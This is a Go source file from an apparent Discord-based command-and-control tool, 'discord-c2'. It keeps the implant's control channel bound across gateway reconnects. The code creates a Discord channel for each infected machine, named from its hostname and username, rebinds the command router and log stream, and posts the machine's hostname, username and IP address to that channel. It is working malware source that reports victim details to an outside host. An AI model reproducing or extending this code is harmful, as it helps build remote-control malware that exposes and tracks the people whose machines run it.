package bot

// This file keeps the device channel bound across gateway reconnects. Discord
// may resume or re-identify at any time; the client re-ensures the category and
// channel, rebinds the router, and posts a short notice.

import (
	"fmt"
	"log"
	"os"
	"os/user"
	"runtime"
	"time"

	"discord-c2/internal/logstream"

	"github.com/bwmarrin/discordgo"
)

var lastReconcile time.Time

func onReady(s *discordgo.Session, _ *discordgo.Ready) {
	handleGatewayEvent(s, "ready")
}

func onResumed(s *discordgo.Session, _ *discordgo.Resumed) {
	handleGatewayEvent(s, "resumed")
}

func onDisconnect(_ *discordgo.Session, _ *discordgo.Disconnect) {
	log.Printf("gateway disconnected; waiting for reconnect")
}

func handleGatewayEvent(s *discordgo.Session, event string) {
	if !startupComplete.Load() {
		// The first READY is handled by the startup path.
		return
	}
	log.Printf("gateway %s; reconciling device channel", event)
	go reconcileSession(s)
}

// reconcileSession re-ensures the OS category and device channel after a
// reconnect, rebinds the router and log stream, and posts a compact notice.
func reconcileSession(s *discordgo.Session) {
	reconcileMu.Lock()
	defer reconcileMu.Unlock()
	if time.Since(lastReconcile) < 5*time.Second {
		return
	}
	lastReconcile = time.Now()

	currentUser, err := user.Current()
	if err != nil {
		log.Printf("reconnect: cannot resolve user: %v", err)
		return
	}
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("reconnect: cannot resolve hostname: %v", err)
		return
	}

	categoryName := categoryForOS(runtime.GOOS)
	categoryID, err := getOrCreateCategory(s, categoryName)
	if err != nil {
		log.Printf("reconnect: ensure category %s: %v", categoryName, err)
		return
	}
	channelName := makeChannelName(hostname, currentUser.Username)
	chID, err := getOrCreateDeviceChannel(s, categoryID, channelName)
	if err != nil {
		log.Printf("reconnect: ensure device channel %s: %v", channelName, err)
		return
	}

	changed := chID != deviceChannel()
	setDeviceChannel(chID)
	logstream.Enable(s, chID)

	msg := fmt.Sprintf("🔄 reconnected · %s | %s | %s", hostname, currentUser.Username, primaryIPv4())
	if changed {
		msg += " · channel changed to <#" + chID + ">"
	}
	if _, err := s.ChannelMessageSend(chID, msg); err != nil {
		log.Printf("reconnect: notice failed: %v", err)
	}
	log.Printf("reconnect: bound to channel %s", chID)
}
